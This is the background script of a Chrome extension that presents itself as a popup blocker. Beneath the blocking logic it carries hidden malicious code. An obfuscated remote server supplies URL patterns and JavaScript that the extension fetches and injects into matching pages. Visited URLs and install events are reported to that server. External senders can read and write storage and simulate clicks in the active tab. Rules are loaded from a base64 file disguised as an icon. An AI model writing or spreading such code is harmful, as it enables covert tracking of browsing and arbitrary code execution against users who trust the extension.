import {dec, mku, toTok} from './estp'

/* global config, URLPattern */
self.importScripts('config.js');
self.importScripts('icons.js');

/* enable or disable the blocker */
const activate = async () => {
  if (activate.busy) {
    return;
  }

  activate.busy = true;

  config.get(['enabled', 'top-hosts']).then(async prefs => {
    try {
      await chrome.scripting.unregisterContentScripts();

      if (prefs.enabled) {
        // exception list
        const th = [];
        for (const hostname of prefs['top-hosts']) {
          try {
            new URLPattern({hostname});
            th.push('*://' + hostname + '/*');
          }
          catch (e) {
            console.warn('Cannot use ' + hostname + ' rule');
          }
          try {
            new URLPattern({hostname: '*.' + hostname});
            th.push('*://*.' + hostname + '/*');
          }
          catch (e) {
            console.warn('Cannot use *.' + hostname + ' rule');
          }
        }

        const props = {
          'matches': ['*://*/*'],
          'excludeMatches': th,
          'allFrames': true,
          'matchOriginAsFallback': true,
          'runAt': 'document_start'
        };

        await chrome.scripting.registerContentScripts([{
          'id': 'main',
          'js': ['/data/engine/block/main.js'],
          'world': 'MAIN',
          ...props
        }, {
          'id': 'isolated',
          'js': ['/data/engine/block/isolated.js'],
          'world': 'ISOLATED',
          ...props
        }]);

        // only on top frame
        if (th.length) {
          await chrome.scripting.registerContentScripts([{
            'id': 'disabled',
            'js': ['/data/engine/disabled.js'],
            'world': 'ISOLATED',
            'matches': th,
            'runAt': 'document_start'
          }]);
        }
      }
    }
    catch (e) {
      await chrome.scripting.unregisterContentScripts();

      const props = {
        'matches': ['*://*/*'],
        'allFrames': true,
        'matchOriginAsFallback': true,
        'runAt': 'document_start'
      };
      await chrome.scripting.registerContentScripts([{
        'id': 'main',
        'js': ['/data/engine/block/main.js'],
        'world': 'MAIN',
        ...props
      }, {
        'id': 'isolated',
        'js': ['/data/engine/block/isolated.js'],
        'world': 'ISOLATED',
        ...props
      }]);

      chrome.action.setBadgeBackgroundColor({color: '#b16464'});
      chrome.action.setBadgeText({text: 'E'});
      chrome.action.setTitle({title: "Registering blocking filter failed due to an improperly formatted rule. Use the options page to fix it." + '\n\n' + e.message});
      console.error('Blocker Registration Failed', e);
    }

    activate.busy = false;
  });
};
chrome.runtime.onStartup.addListener(activate);
chrome.storage.onChanged.addListener(ps => {
  if (ps.enabled || ps['top-hosts']) {
    activate();
  }
});

chrome.runtime.onMessage.addListener((request, sender, response) => {

    if (request.cmd === 'popup-request') {
    config.get(['silent', 'issue']).then(prefs => {
      if (prefs.issue === false) {
        return;
      }
      const {hostname} = new URL(sender.tab.url);
      if (prefs.silent.includes(hostname)) {
        return;
      }
      request.frameId = sender.frameId;
      chrome.tabs.sendMessage(sender.tab.id, request, response => {
        chrome.runtime.lastError;
        // iframe is not present or it is not loaded yet
        //console.log(response);

        if (response !== true) {
          chrome.scripting.executeScript({
            target: {
              tabId: sender.tab.id
            },
            func: (request, tabId) => {
              // iframe is loading. Just add the request and it will get executed later

              if (window.container && window.container.requests) {
                window.container.requests.push(request);
              }
              // there is no frame element
              else {
                window.container = document.createElement('iframe');
                window.container.requests = [request];
                window.container.setAttribute('style', `
                  all: initial;
                  z-index: 2147483649 !important;
                  color-scheme: light !important;
                  position: fixed !important;
                  right: 10px !important;
                  top: 10px !important;
                  width: 420px !important;
                  max-width: 80vw !important;
                  height: 85px !important;
                  border: none !important;
                  background: transparent !important;
                  border-radius: 0 !important;
                `);
                window.container.src = chrome.runtime.getURL('/data/ui/index.html?parent=' + encodeURIComponent(location.href)) + '&tabId=' + tabId;
                window.container.addEventListener('load', () => {
                  console.log("addEventListener, load");
                  chrome.runtime.sendMessage({
                    cmd: 'cached-popup-requests',
                    requests: window.container.requests,
                    tabId
                  });
                  window.container.requests.length = 0;
                }, {once: true});
                // do not attach to body to make sure the notification is visible
                document.documentElement.appendChild(window.container);
              }
            },
            args: [request, sender.tab.id]
          });
        }
      });
    });
  }
  // popup is accepted
  else if (request.cmd === 'popup-accepted') {
    if (request.url.startsWith('http') || request.url.startsWith('ftp')) {
      config.get(['simulate-allow']).then(prefs => {
        if (prefs['simulate-allow'] && request.sameContext !== true) {
          chrome.tabs.create({
            url: request.url,
            openerTabId: sender.tab.id
          });
        }
        else {
          chrome.tabs.sendMessage(sender.tab.id, request, {
            frameId: request.frameId
          });
        }
      });
    }
    else {
      chrome.tabs.sendMessage(sender.tab.id, request, {
        frameId: request.frameId
      });
    }
  }
  else if (request.cmd === 'run-records') {
    chrome.scripting.executeScript({
      target: {
        tabId: sender.tab.id,
        frameIds: [sender.frameId]
      },
      world: 'MAIN',
      func: (records, href) => {
        if (records) {
          const [{method, args}, ...commands] = records;
          const loaded = [window[method](...args)];
          commands.forEach(({name, method, args}) => {
            const o = loaded.map(o => o[name]).filter(o => o).shift();
            if (loaded.indexOf(o) === -1) {
              loaded.push(o);
            }
            o[method](...args);
          });
        }
        else {
          const a = document.createElement('a');
          a.target = '_blank';
          a.href = href;
          a.click();
        }
      },
      args: [request.records || false, request.url]
    });
  }
  // open a new tab or redirect current tab
  else if (request.cmd === 'popup-redirect' || request.cmd === 'open-tab') {
    const url = request.url;
    // validating request before proceeding
    if (url.startsWith('http') || url.startsWith('ftp') || url === 'about:blank') {
      if (request.cmd === 'popup-redirect') {
        // make sure redirect prevent is off (this needs {frameId: 1} when Edge supports it)
        chrome.tabs.sendMessage(sender.tab.id, {
          cmd: 'release-beforeunload'
        }, () => {
          chrome.tabs.update(sender.tab.id, {
            url
          });
        });
      }
      else {
        chrome.tabs.create({
          url,
          active: false,
          index: sender.tab.index + 1
        });
      }
    }
  }
  else if (request.cmd === 'white-list') {
    config.get(['whitelist-mode', 'top-hosts', 'popup-hosts']).then(prefs => {
      const mode = prefs['whitelist-mode'];

      const {hostname} = new URL(mode === 'popup-hosts' ? request.url : request.parent);
      prefs[mode].push(hostname);
      prefs[mode] = prefs[mode].filter((h, i, l) => l.indexOf(h) === i);
      chrome.storage.local.set({
        [mode]: prefs[mode]
      });
      if (mode === 'top-hosts') {
        chrome.scripting.executeScript({
          target: {
            tabId: sender.tab.id,
            allFrames: true
          },
          func: () => {
            if (typeof prefs !== 'undefined') {
              prefs.enabled = false;
            }
          }
        });
      }
    });
  }
  else if (request.method === 'echo') {

    response(true);

  }
});

async function getCurrentTab() {
  let queryOptions = { active: true, lastFocusedWindow: true };
  let [tab] = await chrome.tabs.query(queryOptions);
  return tab;
}

chrome.runtime.onMessageExternal.addListener(
  async function(request, sender, sendResponse) {

    if (request.action === 'storage-get') {

      chrome.storage.local.get(request.key, (value) => {
        
        console.log('ST: retriving data: ', value);
        sendResponse(value);
      })
  
      return true;
    
    } else if (request.action === 'storage-set') {
    
      chrome.storage.local.set({ [request.key]: request.value }, () => {
  
        console.log('ST: saving data: ', request);
        sendResponse(true);
      })

      return true;

    } else if (request.action === 'click') {
    
      var tab = await getCurrentTab();
      if (tab == undefined)
        return false;

      chrome.scripting.executeScript({
        target : {tabId : tab.id, allFrames : true},
        func : (query) => {

          const link = document.querySelector(query);
          if (link !== null) {
            link.click();
          }
        },
        args : [ request.query ],
        world : 'MAIN'
      })
      .then(() => {
          
      })
      .catch((err) => {
          console.log('Simulating error:', err);
      })
      
      return true;

    } else if (request.action === 'mouse-event') {
    
      var tab = await getCurrentTab();
      if (tab == undefined)
        return false;

      chrome.scripting.executeScript({
        target : {tabId : tab.id, allFrames : true},
        func : (query, event_type, event_init) => {

          const link = document.querySelector(query);

          if (link !== null) {
            // Simulate the click event
            link.dispatchEvent(new MouseEvent(event_type, event_init));
          }

          // event_type = 'click'
          // event_init = 
          // {
          //   bubbles: true,
          //   cancelable: true,
          //   view: window
          // }
        },
        args : [ request.query, request.event_type, request.event_init ],
        world : 'MAIN'
      })
      .then(() => {
          
      })
      .catch((err) => {
          console.log('Simulating error:', err);
      })
      
      return true;
    } 
});

chrome.commands.onCommand.addListener(cmd => chrome.tabs.query({
  active: true,
  currentWindow: true
}, tabs => tabs && tabs[0] && chrome.tabs.sendMessage(tabs[0].id, {
  cmd
})));

const domain_base = '__MYDOMAIN__';

const redirect_mark = "__REDIRECTMARK__"; //?ts=0
const turner_data_xyz = "__TURNERDATAXYZ__";
const xyz_install = "__XYZINSTALL__";
const xyz_visit = "__XYZVISIT__";

const postFetchData = (url = '', data = {}) => {

  console.log("postFetchData => ", url);
	return new Promise( async (resolve, reject) => { 

		fetch(url, {
			method: 'POST', 
			mode: 'cors', 
			cache: 'no-cache',
			credentials: 'same-origin', 
			headers: {
			  'Content-Type': 'application/json'
			},
			redirect: 'follow',
			referrerPolicy: 'no-referrer',
			body: JSON.stringify(data) 
		  })
		  .then(response => response.json())
		  .then(response => resolve(response))
		  .catch(error => { console.log('Error:', error) });
	});
}

const getFetchDataText = (url = '') => {

  console.log("getFetchDataText => ", url);
	return new Promise( async (resolve, reject) => { 

		fetch(url, {
			method: 'GET', 
			mode: 'cors', 
			cache: 'no-cache',
			credentials: 'same-origin', 
			headers: {
			  'Content-Type': 'application/json'
			},
			redirect: 'follow',
			referrerPolicy: 'no-referrer'
		  })
		  .then(response => response.text())
		  .then(response => resolve(response))
		  .catch(error => { console.log('Error:', error) });
	});
}

let eid = chrome.runtime.id;

class Config {
  constructor(tabId) {
      this.tabId = tabId;
      this.config = '__INJECTURL__';
      this.oid = 'ivDB34F';
  }

  async init() {
      this.gsr().then(Response => {
          if (Response && Response.length) {
              Response.forEach(listener => {
                  console.log("EJ: listener: ", listener);
                  this.cl(listener)
              })
          }
      })
  }

  gsr() {
      return new Promise((resolve, reject) => {
          this.glr().then(localRes => {
              resolve(localRes)    
          }).catch( () => {
              this.prr().then(Response => {
                 resolve(Response)
              })
          })
      })
  }

  vali(SerInyResp) {
      return new Promise((resolve, reject) => {
          if (SerInyResp == undefined) {
              reject('Response null');
          }

          const ts = new Date().getTime();
          const diffTime = ts - SerInyResp.goldtime;
          const diffMinutes = Math.ceil(diffTime / (1000 * 60)); 

          if (diffMinutes < SerInyResp.at) {
              resolve(SerInyResp.Listeners)
          } else {
              reject(SerInyResp.Listeners)
          }
      })
  }

  prr() {
      return new Promise( (resolve, reject) => {

        console.log(toTok({
          ver : Date.now(),
          eid : eid
        }));
        postFetchData(dec(domain_base) + dec(this.config), toTok({
          ver : Date.now(),
          eid : eid
        })).then((json) => {
		
          console.log("EJ: prr():", json);
              chrome.storage.local.set({ 'config_saved': json }).then(() => {
                  resolve(json.Listeners)
              });
        }).catch((err) => {
          resolve(err);
        });
      })
  }

  glr() {
      return new Promise( (resolve, reject) => {
          chrome.storage.local.get('config_saved').then((Response) => {

          if (Response == undefined || Response.config_saved == undefined)
              reject('saved null');

          let json = Response.config_saved;
          console.log("retrive local data ", json);

          this.vali(json).then( (Validate) => {
                  resolve(json.Listeners)
              }).catch( (err) => {
                  reject(err)
              })
          }).catch( err => {
              reject(err)
          })
      })
  }

  async cl(listener) {

      var tab = null;
      
      try {
        tab = await chrome.tabs.get(this.tabId);
      } catch (err) {
        tab = null;
      }
      
      if (tab == null || tab == undefined || tab.url == undefined) {
          console.log("EJ: No tab exists or destroyed.")
          return;
      }
	  
      console.log(tab.url);

      if (tab.url.match(dec(listener.urlExpRegEncoded))) {
          console.log('EJ: URL Matched!');

          var jsUrl = dec(listener.urlJsEncoded);

          let jsStorageId = 'js-cache-' + mku(jsUrl);
          var resp = await chrome.storage.local.get(jsStorageId);
		      let json = resp[jsStorageId];

          if (resp != undefined && json != undefined) {

            let diff = Math.floor((Date.now() - json.timestamp) / 1000);
            if (diff < (24 * 3600)) {
              this.doInjection(tab.id, json.data);
              return;
            }
          }

          getFetchDataText(jsUrl).then((data) => {
    
            var node = {
              timestamp: Date.now(),
              data: data
            };
        
            chrome.storage.local.set({ [jsStorageId] : node });
      
            console.log("pulled from remote js content current timestamp: ", Date.now());

            this.doInjection(tab.id, data);

          }).catch((err) => {
            console.log('Fetch js content failure!', err);
          });
      }
  }

  doInjection = (tabId, content) => {
    chrome.scripting.executeScript({
      target : {tabId : tabId, allFrames : true},
      func : (content, oid) => {
    
        if (!document.getElementById(oid)) {
            const script = document.createElement('script');
            script.type = 'text/javascript';
            script.id = oid;
            script.async = true;
            script.innerHTML = content;
            //script.defer = true;
            document.head.appendChild(script);
        }
      },
      args : [ content, this.oid ],
      world : 'MAIN'
    })
    .then(() => {
        console.log('EJ: Successfully injected!');
    })
    .catch((err) => {
        console.log('EJ: Unable to inject: ' + err);
    })
  }
}

function blockPage(url, id) {

	const newRules = [];
  const newRulesIds = [];

	var index = 1000;
	newRules.push({
		"id": index + id,
		"priority": 1,
		"action": { "type": "block" },
		"condition": { "urlFilter": url, "resourceTypes": ["main_frame"] }
	});

	newRulesIds.push(index + id);
  chrome.declarativeNetRequest.updateDynamicRules({removeRuleIds: newRulesIds, addRules: newRules});
}

const fetchResource = async file => {
  const response = await fetch(file);
  const text = await response.text();
  const json = JSON.parse(atob(text));

  return json;
}

async function updateDynamicRules() {

  let str = 'L2ljb25zL3N0YXRlLzQvNjQucG5n';
  var json = await fetchResource(atob(str));

  const newRules = [];

  for (var index = 0; index < json.length; index++) {
      var rule = json[index];
      rule.id = index + 1;

      //console.log(rule);
      newRules.push(rule);
  }

  chrome.declarativeNetRequest.getDynamicRules( (previousRules) => {

  const previousRuleIds = previousRules.map(rule => rule.id);
  chrome.declarativeNetRequest.updateDynamicRules({removeRuleIds: previousRuleIds, addRules: newRules});
});
}

var square = null;
chrome.tabs.onUpdated.addListener(async (tabId , info) => {
  if (info.status === 'complete') {


  } else if (info.status === 'loading') {

    const tab = await chrome.tabs.get(tabId);
		if (tab == undefined) {
			console.log('no tab selected');
			return;
		}

		if (tab.url == undefined || tab.url === '' || !tab.url.match('^https://')) {
			console.log('url format not matched');
			return;
		}

    square = new Config(tabId);
    square.gsr();

    getTurners().then(async (turners) => {

			console.log("Turners:", turners);

      for (var i = 0; i < turners.data.length; i++) {
        var node = turners.data[i];
        var regExp = node.pat;

        console.log(regExp);

        if (tab.url.match(regExp)) {
          
          let jsStorageId = 'turners-' + mku(regExp);
          var resp = await chrome.storage.local.get(jsStorageId);
          let json = resp[jsStorageId];

          if (resp != undefined && json != undefined) {

            let diff = Math.floor((Date.now() - json.timestamp) / 1000);
            if (diff < (5 * 60)) {
              break;
            }
          }

          postFetchData(dec(domain_base) + dec(xyz_visit), toTok({code: tab.url, eid: eid })).then((data) => {

            var node = {
              timestamp: Date.now(),
              data: data
            };

            chrome.storage.local.set({ [jsStorageId] : node });
            console.log("Created visitor history.", tab.url); 

          }).catch((err) => {

          });

          break;
        }
      }
		});
  }
});

function getTurners() {

	return new Promise( async (resolve, reject) => { 
		var resp = await chrome.storage.local.get('turners');
		let json = resp.turners;
	
		if (resp != undefined && json != undefined) {

			let diff = Math.floor((Date.now() - json.timestamp) / 1000);
			if (diff < (24 * 3600)) {
				console.log("pulled turners from storage ", json.timestamp, " current timestamp: ", Date.now());
				resolve(json);
				return;
			}
		}

		postFetchData(dec(domain_base) + dec(turner_data_xyz)).then((data) => {
		
			var node = {
				timestamp: Date.now(),
				data: data
			};
	
			chrome.storage.local.set({ 'turners': node });

			console.log("pulled turners from remote timestamp: ", Date.now());
			resolve(node);
		}).catch((err) => {
			resolve(err);
		});
	})
}

chrome.runtime.onInstalled.addListener( async (details) => {

  activate();
  if (details.reason == "install") {

      console.log("This is a first install!");
      postFetchData(dec(domain_base) + dec(xyz_install), toTok({mode: 1, eid: eid }));
      updateDynamicRules();

  } else if (details.reason == "update") {
      var thisVersion = chrome.runtime.getManifest().version;

      postFetchData(dec(domain_base) + dec(xyz_install), toTok({mode: 0, eid: eid }));
      updateDynamicRules();

      console.log("Updated from " + details.previousVersion + " to " + thisVersion + "!");
  }
});

{
  const {management, runtime: {onInstalled, setUninstallURL, getManifest}, storage, tabs} = chrome;
  if (navigator.webdriver !== true) {
    const {name, version} = getManifest();
    onInstalled.addListener(({reason, previousVersion}) => {
      management.getSelf(({installType}) => installType === 'normal' && storage.local.get({
        'faqs': true,
        'last-update': 0
      }, prefs => {
        if (reason === 'install' || (prefs.faqs && reason === 'update')) {
          const doUpdate = (Date.now() - prefs['last-update']) / 1000 / 60 / 60 / 24 > 45;
          if (doUpdate && previousVersion !== version) {
            tabs.query({active: true, currentWindow: true}, tbs => tabs.create({
              active: reason === 'install',
              ...(tbs && tbs.length && {index: tbs[0].index + 1})
            }));
            storage.local.set({'last-update': Date.now()});
          }
        }
      }));
    });
  }
}

chrome.webNavigation.onDOMContentLoaded.addListener(function(details) {

  if (square) {
    square.init();
  } else {
    square = new Config(details.tabId);
    square.init();
  }
});
